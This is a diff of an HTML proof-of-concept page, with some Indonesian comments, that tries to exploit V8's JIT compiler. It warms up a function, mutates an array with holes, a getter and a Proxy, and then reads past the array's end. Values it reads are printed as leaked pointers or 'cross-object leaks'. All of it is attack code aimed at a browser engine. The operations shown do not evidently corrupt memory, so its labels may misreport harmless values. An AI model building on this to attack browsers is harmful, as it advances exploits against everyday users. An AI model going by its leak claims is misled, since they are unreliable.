@@ -1,6 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Deterministic Leak PoC</title>
+<title>V8 Structured Leak PoC</title>
 
 <pre id="log"></pre>
 <script>
@@ -9,31 +9,35 @@ const log = m => {
   console.log(m);
 };
 
-// TARGET
+// ========= UTILS =========
+function f2i(f){
+  let buf = new ArrayBuffer(8);
+  let f64 = new Float64Array(buf);
+  let u64 = new BigUint64Array(buf);
+  f64[0] = f;
+  return u64[0];
+}
+
+// ========= TARGET =========
 function vuln(a,i){ return a[i] + 1.1; }
 
-// WARMUP (cukup, tapi tidak berlebihan)
+// ========= WARMUP =========
 function warmup(){
   let arr = Array.from({length:20}, (_,i)=>i+0.5);
   for(let i=0;i<50000;i++) vuln(arr, i%20);
   return arr;
 }
 
-// MUTATION (FIXED, NO RANDOM)
+// ========= MUTATION =========
 function mutate(arr){
-  // create holes
   delete arr[0];
   delete arr[1];
-  delete arr[2];
 
-  // shrink lalu extend
   arr.length = 5;
   arr[40] = 13.37;
 
-  // paksa type confusion
   arr[3] = {x:1};
 
-  // getter deterministic
   Object.defineProperty(arr,1,{
     get(){
       arr[10] = 99.99;
@@ -44,28 +48,39 @@ function mutate(arr){
   return arr;
 }
 
-// MINIMAL ASSUMPTION BREAK
+// ========= BREAK =========
 function breakAssumption(a){
   return new Proxy(a,{
     get(t,p){
-      if(p === "length"){
-        t[20] = 77.77; // deterministic
+      if(p==="length"){
+        t[25] = 77.77;
       }
       return Reflect.get(t,p);
     }
   });
 }
 
-// TYPED ARRAY
+// ========= CONTROLLED MEMORY =========
+
+// buffer target (ingin "dileak")
+let victimBuf = new ArrayBuffer(0x100);
+let victimF64 = new Float64Array(victimBuf);
+
+// isi pattern unik (mudah dikenali)
+for(let i=0;i<victimF64.length;i++){
+  victimF64[i] = 13.371337 + i;
+}
+
+// buffer normal
 let buf = new ArrayBuffer(0x2000);
 let f64 = new Float64Array(buf);
 
-// INIT PATTERN (penting buat deteksi)
+// isi pattern baseline
 for(let i=0;i<f64.length;i++){
   f64[i] = 0x41414141 + i;
 }
 
-// MAIN
+// ========= MAIN =========
 function run(){
   log("[*] warmup");
   let base = warmup();
@@ -76,35 +91,38 @@ function run(){
   arr = mutate(arr);
   arr = breakAssumption(arr);
 
-  // trigger JIT assumption
-  let r1 = vuln(arr,1);
-  let r2 = vuln(arr,10);
-  let r3 = vuln(arr,40);
+  vuln(arr,1);
+  vuln(arr,10);
+  vuln(arr,40);
 
-  log("r1=" + r1);
-  log("r2=" + r2);
-  log("r3=" + r3);
-
-  // CHECK OOB (FIXED RANGE)
-  for(let i=0;i<20;i++){
+  // ========= OOB READ =========
+  for(let i=0;i<50;i++){
     let idx = arr.length + i;
     let v = arr[idx];
+
     if(v !== undefined){
       log("[OOB] idx="+idx+" val="+v);
+
+      // detect pointer-like
+      if(typeof v === "number" && Math.abs(v) > 1e12){
+        let ptr = f2i(v);
+        log("[LEAK PTR] 0x"+ptr.toString(16));
+      }
     }
   }
 
-  // CHECK TYPED ARRAY CORRUPTION
-  for(let i=0;i<50;i++){
+  // ========= SCAN FOR FOREIGN MEMORY =========
+  for(let i=0;i<200;i++){
     let v = f64[i];
 
-    // kalau berubah dari pattern awal → suspicious
+    // kalau beda dari baseline → kemungkinan leak
     if(v !== 0x41414141 + i){
-      log("[CORRUPTION] idx="+i+" val="+v);
-    }
+      log("[MEM DIFF] idx="+i+" val="+v);
 
-    if(Math.abs(v) > 1e12){
-      log("[PTR-LIKE] idx="+i+" val="+v);
+      // cek apakah mirip pattern victim
+      if(Math.abs(v - 13.371337) < 100){
+        log("[🔥 POSSIBLE CROSS-OBJECT LEAK] "+v);
+      }
     }
   }
 
